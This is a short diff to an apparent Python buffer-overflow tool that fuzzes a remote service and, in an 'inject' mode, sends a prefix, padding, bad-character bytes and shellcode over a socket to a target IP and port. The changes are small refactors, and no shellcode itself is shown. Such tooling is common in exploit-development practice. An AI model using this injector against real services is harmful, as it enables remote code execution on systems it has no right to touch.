@@ -132,7 +132,7 @@ def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, us
 
     payload = prefix + prefill + BadChars + shellcode
 
-    s.sendall(payload + bytes("\n\r", "latin-1"))
+    s.sendall(payload + b"\n\r")
 
     print(f"Injected {len(payload)} bytes to {target_ip}:{target_port}")
 
@@ -178,7 +178,7 @@ def main():
     target_port = args.targetPort
     step = args.step
     prefix = bytearray(args.prefix, encoding='ascii')
-    postfix = bytearray(args.postfix, encoding='ascii')
+    #postfix = bytearray(args.postfix, encoding='ascii')
     prefill_num = args.prefill_num
     prefill_pattern = bytearray(args.prefill_pattern, encoding='ascii')
     useBadChars = args.useBadChars
@@ -189,13 +189,13 @@ def main():
     if mode == "spike" or mode == "fuzz":
 
         #test_connection(target_ip, target_port)
-        spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step, postfix)
+        spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step)
 
     elif mode == "inject":
 
         #test_connection(target_ip, target_port)
         inject_mode(target_ip, target_port, BadChars,
-                    prefix, prefill, shellcode, useBadChars,postfix)
+                    prefix, prefill, shellcode, useBadChars)
 
     else:
         print(f"Uknown mode: {mode} ... exiting")
